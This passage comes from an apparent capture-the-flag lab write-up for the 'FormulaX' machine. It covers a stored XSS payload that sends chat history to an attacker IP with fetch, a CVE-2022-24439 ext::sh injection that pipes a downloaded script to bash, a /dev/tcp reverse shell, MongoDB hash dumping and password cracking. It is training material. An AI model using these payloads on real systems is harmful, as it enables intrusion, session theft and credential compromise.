</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;big_container&#39;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The second one, <code>chat.js</code>, looks interesting, since it is making a request to the API endpoint <code>/user/api/chat</code>. Additionally, if we intercept with <code>Burpsuite</code> what is sent when we make a query to the bot we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/socket.io/?EIO=4&amp;transport=polling&amp;t=O-U2x4Z</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.6</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.6/restricted/chat.html</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>authorization=Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NjRkNTJhOTY2Nzg2M2QwYTNmYjhkMDYiLCJpYXQiOjE3MTYzNDM0NzV9._-XmykICwd7YdKAVfT9NyuKr64XofXHrFc5VqXH3fyw</span>
</span></span></code></pre></div><p>where it is making a request to <code>/socket.io</code> socket.</p><p>Searching <code>What is socket.io?</code> on Google we have:<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content>Socket.IO is a library that enables low-latency, bidirectional and event-based communication between a client and a server.</div></div></p><p>From <a href=https://socket.io/docs/v2/#minimal-working-example class=external-link target=_blank rel=noopener>Socket.io documentation</a>, in the example of an <code>index.html</code> file, we can see that it is making a request to: <code>/socket.io/socket.io.js</code>.</p><p>We can check that this file exists at <code>http://10.10.11.6/socket.io/socket.io.js</code> with <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.10.11.6/socket.io/socket.io.js | head
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/*!
</span></span></span><span class=line><span class=cl><span class=go> * Socket.IO v4.7.1
</span></span></span><span class=line><span class=cl><span class=go> * (c) 2014-2023 Guillermo Rauch
</span></span></span><span class=line><span class=cl><span class=go> * Released under the MIT License.
</span></span></span><span class=line><span class=cl><span class=go> */
</span></span></span><span class=line><span class=cl><span class=go>(function (global, factory) {
</span></span></span><span class=line><span class=cl><span class=go>  typeof exports === &#39;object&#39; &amp;&amp; typeof module !== &#39;undefined&#39; ? module.exports = factory() :
</span></span></span><span class=line><span class=cl><span class=go>  typeof define === &#39;function&#39; &amp;&amp; define.amd ? define(factory) :
</span></span></span><span class=line><span class=cl><span class=go>  (global = typeof globalThis !== &#39;undefined&#39; ? globalThis : global || self, global.io = factory());
</span></span></span><span class=line><span class=cl><span class=go>})(this, (function () { &#39;use strict&#39;;
</span></span></span></code></pre></div><p>With all this data we can now try to send a payload. We created a malicious <code>JavaScript</code> payload/exploit that intercepts the request and encode the message obtained to <code>base64</code>, adapting <code>chat.js</code> file found previously:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>script</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;script&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>script</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;/socket.io/socket.io.js&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>script</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>script</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;load&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=nx>axios</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=sb>`/user/api/chat`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>socket</span> <span class=o>=</span> <span class=nx>io</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,{</span><span class=nx>withCredentials</span><span class=o>:</span><span class=kc>true</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>my_message</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://10.10.16.2:8000/?d=&#34;</span> <span class=o>+</span> <span class=nx>btoa</span><span class=p>(</span><span class=nx>my_message</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s1>&#39;client_message&#39;</span><span class=p>,</span> <span class=s1>&#39;history&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>and save this file as <code>exploit.js</code>.</p><p>In the webpage of the victim machine, I go back to <code>Contact Us</code> page, fill the fields, and intercept again the message with <code>Burpsuite</code>. I send this intercepted request to the <code>Repeater</code> (<code>Ctrl+R</code> to the intercepted payload). I start another <code>Python</code> <code>HTTP</code> server on port <code>8000</code> and, then, send the following <code>HTTP</code> request with <code>Burpsuite</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/user/api/contact_us</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.6</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/plain, */*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>168</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.6</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.6/restricted/contact_us.html</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>authorization=Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NjRkNTVmZjY2Nzg2M2QwYTNmYjk0OTgiLCJpYXQiOjE3MTYzNDQzMzh9.Luv5ZIi-x48Bwf1cTRpJD2KQSwqGOeO-g0jwxtfj-Rk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;first_name&#34;</span><span class=p>:</span><span class=s2>&#34;John&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;last_name&#34;</span><span class=p>:</span><span class=s2>&#34;Wick&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;message&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;img src=x onerror=\&#34;with(top)body.appendChild (createElement(&#39;script&#39;)).src=&#39;http://10.10.16.2:8000/exploit.js&#39;\&#34;&gt;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>where <code>10.10.16.2</code> is my attacker IP. Here the important part is the payload contained in the <code>message</code> parameter.</p><div class="notice warning"><div class=notice-title><i class="fa-solid fa-exclamation-triangle" aria-hidden=true></i>Warning</div><div class=notice-content>Note that the in the last request cookie might change. I have also noticed that our created user is deleted after some minutes, so we might have to create it again.</div></div><p>After sending the payload, in my temporal server I get something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;GET /exploit.js HTTP/1.1&#34; 200 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] code 501, message Unsupported method (&#39;OPTIONS&#39;)
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] code 501, message Unsupported method (&#39;OPTIONS&#39;)
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1&#34; 501 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1&#34; 501 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] code 501, message Unsupported method (&#39;OPTIONS&#39;)
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1&#34; 501 -
</span></span></span></code></pre></div><p>Decoding these messages we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo -n &#39;SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg==&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Hello, I am Admin.Testing the Chat Application%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ echo -n &#39;V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Write a script for  dev-git-auto-update.chatbot.htb to work properly%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ echo -n &#39;V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Write a script to automate the auto-update%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ echo -n &#39;TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Message Sent:&lt;br&gt;history
</span></span></span></code></pre></div><p>Here I can see a new domain: <code>dev-git-auto-update.chatbot.htb</code>. I decide to add this domain to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.6 dev-git-auto-update.chatbot.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><p>Visiting <code>http://dev-git-auto-update.chatbot.htb</code> shows a new page:</p><p><img alt="FormulaX 5" src=/pentesting/images/FormulaX_5.png></p><p>where, at the bottom of the page, I can see the text <code>Made with ‚ù§ by Chatbot Using simple-git v3.14</code>.</p><p>Searching for exploits for <code>simple-git</code> for this version we find <a href=https://github.com/gitpython-developers/GitPython/issues/1515 class=external-link target=_blank rel=noopener>this Issue in Github</a>, based on <a href=https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858 class=external-link target=_blank rel=noopener>this report</a> that also provides a Proof of Concept that shows a vulnerability labeled as <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-24439 class=external-link target=_blank rel=noopener>CVE-2022-24439</a> that allows <code>Remote Code Execution</code>. Basically, based on the PoC provided, we could type:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ext::sh -c touch% /tmp/pwned
</span></span></span></code></pre></div><p>to create a file named <code>/tmp/pwned</code>.</p><p>So I decide to create a file named <code>rev.sh</code> in my attacker machine that contains:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>and assign to it execution permission with <code>chmod +x rev.sh</code>. Expose this file starting a temporal <code>Python</code> <code>HTTP</code> server on port <code>8000</code> (<code>python3 -m http.serrver 8000</code>) and run in the development page <code>http://dev-git-auto-update.chatbot.htb</code> the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ext::sh -c curl% http://10.10.16.2/rev.sh|bash
</span></span></span></code></pre></div><p>And before passing it to the page, start a <code>netcat</code> listener on port <code>443</code>, then run in the webpage the payload:</p><p><img alt="FormulaX 6" src=/pentesting/images/FormulaX_6.png></p><p>and we get a shell as <code>www-data</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.6] 38452
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1164): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><p>Checking for internal ports I can see port <code>27017</code> running,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ ss -ntlp
</span></span></span><span class=line><span class=cl><span class=go>State         Recv-Q        Send-Q               Local Address:Port                 Peer Address:Port        Process
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                        0.0.0.0:80                        0.0.0.0:*            users:((&#34;nginx&#34;,pid=954,fd=7),(&#34;nginx&#34;,pid=953,fd=7))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:8081                      0.0.0.0:*            users:((&#34;node /var/www/g&#34;,pid=1164,fd=20))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:8082                      0.0.0.0:*            users:((&#34;node /var/www/a&#34;,pid=1163,fd=19))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             4096                 127.0.0.53%lo:53                        0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             128                        0.0.0.0:22                        0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:3000                      0.0.0.0:*            users:((&#34;nginx&#34;,pid=954,fd=6),(&#34;nginx&#34;,pid=953,fd=6))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:8000                      0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             10                       127.0.0.1:46465                     0.0.0.0:*            users:((&#34;chrome&#34;,pid=1263,fd=45))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             4096                     127.0.0.1:27017                     0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             80                       127.0.0.1:3306                      0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             128                           [::]:22                           [::]:*
</span></span></span></code></pre></div><p>which is the default port for <code>MongoDB</code>. We can get inside the database running <code>mongo --shell</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ mongo --shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>MongoDB shell version v4.4.29
</span></span></span><span class=line><span class=cl><span class=go>connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb
</span></span></span><span class=line><span class=cl><span class=go>Implicit session: session { &#34;id&#34; : UUID(&#34;d6df1c53-2af2-4f5d-8b1e-e9fb5c903c56&#34;) }
</span></span></span><span class=line><span class=cl><span class=go>MongoDB server version: 4.4.8
</span></span></span><span class=line><span class=cl><span class=go>type &#34;help&#34; for help
</span></span></span><span class=line><span class=cl><span class=go>Welcome to the MongoDB shell.
</span></span></span><span class=line><span class=cl><span class=go>For interactive help, type &#34;help&#34;.
</span></span></span><span class=line><span class=cl><span class=go>For more comprehensive documentation, see
</span></span></span><span class=line><span class=cl><span class=go>        https://docs.mongodb.com/
</span></span></span><span class=line><span class=cl><span class=go>Questions? Try the MongoDB Developer Community Forums
</span></span></span><span class=line><span class=cl><span class=go>        https://community.mongodb.com
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>The server generated these startup warnings when booting:
</span></span></span><span class=line><span class=cl><span class=go>        2024-05-20T18:10:37.949+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
</span></span></span><span class=line><span class=cl><span class=go>        2024-05-20T18:10:40.991+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>
</span></span></code></pre></div><p>Once inside, I can see a <code>testing</code> database, with <code>users</code> table. If we see what is inside it we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>&gt;</span> use testing
</span></span><span class=line><span class=cl><span class=go> 
</span></span></span><span class=line><span class=cl><span class=go>switched to db testing
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>&gt;</span> show tables
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>messages
</span></span></span><span class=line><span class=cl><span class=go>users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>&gt;</span> db.users.find<span class=o>()</span>.pretty<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>        &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457c&#34;),
</span></span></span><span class=line><span class=cl><span class=go>        &#34;name&#34; : &#34;admin&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;email&#34; : &#34;admin@chatbot.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;password&#34; : &#34;$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;terms&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;value&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;authorization_token&#34; : &#34;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTYzNDY5MDN9.LAXwL7wyyZ4mniyMYHIZ0mGr4c6uCCxZBd5Hd7XBiWo&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;__v&#34; : 0
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span><span class=line><span class=cl><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>        &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457d&#34;),
</span></span></span><span class=line><span class=cl><span class=go>        &#34;name&#34; : &#34;frank_dorky&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;email&#34; : &#34;frank_dorky@chatbot.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;password&#34; : &#34;$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;terms&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;value&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;authorization_token&#34; : &#34; &#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;__v&#34; : 0
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>Here I can see 2 users with a hash: <code>admin</code> and <code>frank_dorky</code>
I note that <code>frank_dorky</code> user exists in this machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>frank_dorky  kai_relay
</span></span></span></code></pre></div><p>I save both hashes in a file called <code>found_hashes</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat found_hashes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>admin:$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.
</span></span></span><span class=line><span class=cl><span class=go>frank_dorky:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
</span></span></span></code></pre></div><p>and attempt to crack them with a <code>Brute Force Password Cracking</code> using <code>JohnTheRipper</code> (<code>john</code>) along with <code>rockyou.txt</code> dictionary.</p><p>We find a password for the user <code>frank_dorky</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt found_hashes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>manchesterunited (frank_dorky)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:13:45 1.01% (ETA: 21:46:18) 0.001210g/s 208.0p/s 211.5c/s 211.5C/s gamita..fugitiva
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span></code></pre></div><p>We have credentials: <code>frank_dorky:manchesterunited</code>.</p><p>I check if we can connect providing these credentials via <code>SSH</code> with <code>NetExec</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.6 -u &#39;frank_dorky&#39; -p &#39;manchesterunited&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.6      22     10.10.11.6       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.6      22     10.10.11.6       [+] frank_dorky:manchesterunited  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>and they work.</p><p>So we log in via <code>SSH</code> as <code>frank_dorky</code> user and obtain the user flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;manchesterunited&#39; ssh -o stricthostkeychecking=no frank_dorky@10.10.11.6
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Tue Mar  5 10:19:47 2024 from 10.10.14.23
</span></span></span><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>user.txt
</span></span></span></code></pre></div><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>From internal ports open I remember that port <code>3000</code> was running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ ss -ntlp | grep &#34;3000&#34;
</span></span></span><span class=line><span class=cl><span class=go>LISTEN 0      511        127.0.0.1:3000       0.0.0.0:*
